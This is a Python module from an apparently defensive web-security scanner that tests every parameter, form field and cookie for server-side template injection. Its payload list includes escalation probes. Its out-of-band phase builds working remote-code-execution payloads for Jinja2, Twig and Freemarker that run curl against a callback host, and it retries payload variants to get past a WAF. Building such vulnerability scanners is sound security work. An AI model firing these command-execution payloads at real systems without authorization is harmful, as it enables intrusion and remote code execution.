"""
Server-Side Template Injection (SSTI) Scanner — per-parameter isolation.

Uses InsertionPoint engine for systematic, isolated injection into every
parameter, POST field, cookie, and header independently.

Detection:
  - DetectionEngine.test_template_eval() with baseline-aware checks
  - Unique math expressions (987*123=121401) to avoid FP collisions
  - Confirmation with second expression for CONFIRMED status
  - ErrorPatternMatcher for template error detection
  - OOB blind SSTI via callback
"""

import time
from urllib.parse import urlparse, parse_qs

from secprobe.config import Severity
from secprobe.core.detection import Confidence, ErrorPatternMatcher, ResponseAnalyzer
from secprobe.core.exceptions import TargetUnreachableError, WAFBlockedError
from secprobe.core.insertion_points import (
    InsertionPointDiscovery, InsertionType, InsertionPoint, send_request,
)
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


# Use unique math products to avoid collisions with page content
SSTI_PAYLOADS = [
    # Detection: unique math canary (121401 is unlikely on any page)
    {"payload": "{{987*123}}", "expect": "121401", "engine": "Jinja2/Twig/Nunjucks"},
    {"payload": "${987*123}", "expect": "121401", "engine": "Freemarker/Mako/EL"},
    {"payload": "#{987*123}", "expect": "121401", "engine": "Thymeleaf/Ruby ERB"},
    {"payload": "<%= 987*123 %>", "expect": "121401", "engine": "ERB/JSP"},
    {"payload": "${{987*123}}", "expect": "121401", "engine": "Pebble/Spring EL"},
    {"payload": "{987*123}", "expect": "121401", "engine": "Smarty"},

    # Confirmation: different product (231163)
    {"payload": "{{853*271}}", "expect": "231163", "engine": "Jinja2/Twig (confirm)"},
    {"payload": "${853*271}", "expect": "231163", "engine": "Freemarker/Mako (confirm)"},

    # String multiplication (Jinja2-specific)
    {"payload": "{{7*\'7\'}}", "expect": "7777777", "engine": "Jinja2 (string mul)"},

    # Escalation: config / class access
    {"payload": "{{config}}", "expect": "<Config", "engine": "Jinja2 (Flask config)"},
    {"payload": "{{self.__class__}}", "expect": "class", "engine": "Jinja2 (class access)"},
    {"payload": "{{request.application.__globals__}}", "expect": "__builtins__", "engine": "Jinja2 (globals)"},
    {"payload": "${T(java.lang.Runtime).getRuntime()}", "expect": "Runtime", "engine": "Spring EL (RCE)"},
    {"payload": "{{\'\'.__class__.__mro__}}", "expect": "class", "engine": "Jinja2 (MRO chain)"},

    # Polyglots -- error-based detection
    {"payload": "${{<%[%\'\"}}\\\\.%\\", "expect": "error", "engine": "Polyglot (error)"},
]


class SSTIScanner(SmartScanner):
    name = "SSTI Scanner"
    description = "Test for Server-Side Template Injection vulnerabilities"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"Testing SSTI on {url}", "progress")

        # -- Initialize detection engine
        engine = self._init_detection_engine()

        try:
            baseline = self.http_client.get(url)
        except TargetUnreachableError as e:
            print_status(f"Cannot reach target: {e}", "error")
            self.result.error = str(e)
            return

        baseline_text = baseline.text

        # Profile the endpoint
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        engine.profile(url, params=params or None)

        # -- Discover ALL insertion points
        discovery = InsertionPointDiscovery(
            http_client=self.http_client,
            include_headers=False,  # SSTI via headers is rare
            include_cookies=True,
            include_paths=True,
        )

        # Gather test URLs
        test_urls = self._build_test_urls(url)
        if self.context:
            for u in self.context.get_injection_urls():
                if u not in test_urls:
                    test_urls.append(u)

        if not test_urls:
            test_urls = [
                f"{url}?name=test", f"{url}?q=test",
                f"{url}?template=test", f"{url}?page=test",
                f"{url}?msg=test", f"{url}?text=test",
            ]

        # Discover forms
        forms = self.context.get_injectable_forms() if self.context else []

        # Build insertion points
        all_points: list[InsertionPoint] = []
        for test_url in test_urls:
            points = discovery.discover(test_url, response=baseline, forms=forms)
            all_points.extend(points)

        # Separate by type
        param_points = [p for p in all_points if p.type in (
            InsertionType.QUERY_PARAM, InsertionType.PATH_SEGMENT)]
        form_points = [p for p in all_points if p.type == InsertionType.POST_PARAM]
        cookie_points = [p for p in all_points if p.type == InsertionType.COOKIE]

        total_points = len(all_points)
        print_status(
            f"Discovered {total_points} insertion points "
            f"({len(param_points)} params, {len(form_points)} forms, "
            f"{len(cookie_points)} cookies)", "info"
        )

        found_vulns: set[tuple] = set()

        # ── Detect target technology for engine-specific hints ───────
        baseline_tech = self.detect_technology(baseline_text)
        if baseline_tech:
            print_status(f"Technology detected: {', '.join(baseline_tech)}", "info")

        # -- Phase 1: Parameter-based SSTI (per-parameter isolation)
        print_status("Phase 1: Parameter-based SSTI (per-parameter isolation)", "progress")
        for point in param_points:
            point_key = (point.base_url.split("?")[0], point.name)
            if point_key in found_vulns:
                continue

            for item in SSTI_PAYLOADS:
                if self.config.rate_limit:
                    time.sleep(self.config.rate_limit)

                payload_variants = self._evade_payload(item["payload"], vuln_type="ssti")
                resp = None
                used_spec = None
                for p in payload_variants:
                    spec = point.inject(p, mode="replace")
                    try:
                        resp = send_request(self.http_client, spec, allow_redirects=False)
                        used_spec = spec
                        break
                    except WAFBlockedError:
                        continue
                    except Exception:
                        continue

                if resp is None or used_spec is None:
                    continue

                expected = item["expect"]
                engine_name = item["engine"]

                if expected == "error":
                    matches = ErrorPatternMatcher.match_template_errors(
                        resp.text, baseline_text)
                    if matches:
                        best = max(matches, key=lambda m: m.confidence)
                        if best.confidence >= Confidence.FIRM:
                            found_vulns.add(point_key)
                            self.add_finding(
                                title=f"SSTI - Template error leaked ({engine_name})",
                                severity=Severity.HIGH,
                                description=(
                                    f"Polyglot payload caused template error "
                                    f"(confidence: {best.confidence.name}).\n"
                                    f"Injection point: {point.display_name}\n"
                                    f"Pattern: {best.matched_text[:100]}"
                                ),
                                recommendation="Never pass user input directly to template engines.",
                                evidence=f"Parameter: {point.name}\nURL: {used_spec.url}\nMatch: {best.description}",
                                category="Template Injection",
                                url=used_spec.url,
                                cwe="CWE-1336",
                            )
                            print_finding(Severity.HIGH, f"SSTI error: {engine_name} via {point.name}")
                else:
                    result = engine.test_template_eval(
                        url=used_spec.url,
                        parameter=point.name,
                        expression=item["payload"],
                        expected=expected,
                        response_text=resp.text,
                        baseline_text=baseline_text,
                        response_status=resp.status_code,
                    )

                    if result.confidence >= Confidence.FIRM:
                        escalation_kws = ("config", "__class__", "__globals__",
                                          "Runtime", "__mro__")
                        if any(kw in item["payload"] for kw in escalation_kws):
                            sev = Severity.CRITICAL
                        elif result.confidence >= Confidence.CONFIRMED:
                            sev = Severity.CRITICAL
                        else:
                            sev = Severity.HIGH

                        # ── SmartScanner verification ────────────────
                        verification = self.verify_finding(
                            url=used_spec.url, param=point.name,
                            payload=item["payload"], vuln_type="ssti",
                        )

                        found_vulns.add(point_key)
                        if verification.confirmed:
                            self.add_verified_finding(
                                title=f"Verified SSTI - {engine_name}",
                                severity=sev,
                                description=(
                                    f"Template expression VERIFIED "
                                    f"(confidence: {verification.confidence.name}).\n"
                                    f"Injection point: {point.display_name}\n"
                                    f"{item['payload']} -> {expected}\n"
                                    f"Evidence: {'; '.join(result.evidence)}"
                                ),
                                confidence=verification.confidence,
                                verification_evidence=verification.evidence,
                                recommendation="Sandbox template engines. Never pass raw user input to render().",
                                category="Template Injection",
                                url=used_spec.url,
                                cwe="CWE-1336",
                            )
                            print_finding(sev, f"Verified SSTI: {engine_name} via {point.name}")
                        else:
                            self.add_finding(
                                title=f"SSTI - {engine_name}",
                                severity=sev,
                                description=(
                                    f"Template expression evaluated "
                                    f"(confidence: {result.confidence.name}).\n"
                                    f"Injection point: {point.display_name}\n"
                                    f"{item['payload']} -> {expected}\n"
                                    f"Evidence: {'; '.join(result.evidence)}"
                                ),
                                recommendation="Sandbox template engines. Never pass raw user input to render().",
                                evidence=(
                                    f"Parameter: {point.name} ({point.type.value})\n"
                                    f"URL: {used_spec.url}\n"
                                    f"Input: {item['payload']}\n"
                                    f"Output: {expected}\n"
                                    f"In baseline: {result.score_breakdown.get('in_baseline', 'unknown')}"
                                ),
                                category="Template Injection",
                                url=used_spec.url,
                                cwe="CWE-1336",
                            )
                            print_finding(sev, f"SSTI: {engine_name} via {point.name} ({result.confidence.name})")

        # -- Phase 2: POST form SSTI (per-field isolation)
        print_status("Phase 2: POST form SSTI (per-field isolation)", "progress")
        for point in form_points:
            point_key = (point.base_url.split("?")[0], point.name)
            if point_key in found_vulns:
                continue

            for item in SSTI_PAYLOADS[:8]:  # Top 8 math probes
                if item["expect"] == "error":
                    continue

                spec = point.inject(item["payload"], mode="replace")
                try:
                    resp = send_request(self.http_client, spec, allow_redirects=False)
                except Exception:
                    continue

                if not ResponseAnalyzer.contains_new(
                        baseline_text, resp.text, item["expect"]):
                    continue

                found_vulns.add(point_key)
                self.add_finding(
                    title=f"SSTI (POST) - {item['engine']} via '{point.name}'",
                    severity=Severity.HIGH,
                    description=(
                        f"POST SSTI at {point.base_url} (baseline-verified)\n"
                        f"Injection point: {point.display_name}"
                    ),
                    recommendation="Sandbox template engines.",
                    evidence=f"Field: {point.name}\nPayload: {item['payload']}",
                    category="Template Injection",
                    url=point.base_url,
                    cwe="CWE-1336",
                )
                break

        # -- Phase 3: OOB blind SSTI (per-parameter)
        if self.oob_available:
            print_status("OOB blind SSTI testing (per-parameter)", "progress")
            oob_count = 0
            for point in param_points[:5]:
                point_key = (point.base_url.split("?")[0], point.name)
                if point_key in found_vulns:
                    continue

                # Jinja2 OOB
                token = self.oob_generate_token(point.base_url, point.name, "ssti_blind", "jinja2_oob")
                cb_url = self.oob_get_url(token)
                p = "{{request.application.__globals__.__builtins__.__import__('os').popen('curl " + cb_url + "').read()}}"
                spec = point.inject(p, mode="replace")
                try:
                    send_request(self.http_client, spec, allow_redirects=False)
                    oob_count += 1
                except Exception:
                    pass

                # Twig OOB
                token = self.oob_generate_token(point.base_url, point.name, "ssti_blind", "twig_oob")
                cb_url = self.oob_get_url(token)
                p = "{{['curl " + cb_url + "']|filter('system')}}"
                spec = point.inject(p, mode="replace")
                try:
                    send_request(self.http_client, spec, allow_redirects=False)
                    oob_count += 1
                except Exception:
                    pass

                # Freemarker OOB
                token = self.oob_generate_token(point.base_url, point.name, "ssti_blind", "freemarker_oob")
                cb_url = self.oob_get_url(token)
                p = '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl ' + cb_url + '")}'
                spec = point.inject(p, mode="replace")
                try:
                    send_request(self.http_client, spec, allow_redirects=False)
                    oob_count += 1
                except Exception:
                    pass

            if oob_count:
                print_status(f"Sent {oob_count} OOB SSTI payloads, waiting...", "progress")
                self.oob_collect_findings(wait_seconds=10)

        # -- Summary
        if not found_vulns:
            print_status("No SSTI vulnerabilities detected.", "success")
            self.add_finding(
                title="No SSTI detected",
                severity=Severity.INFO,
                description=(
                    f"Automated tests did not detect template injection.\n"
                    f"Insertion points tested: {total_points}"
                ),
                category="Template Injection",
            )

    def _build_test_urls(self, url):
        parsed = urlparse(url)
        if parsed.query:
            return [url]
        return []
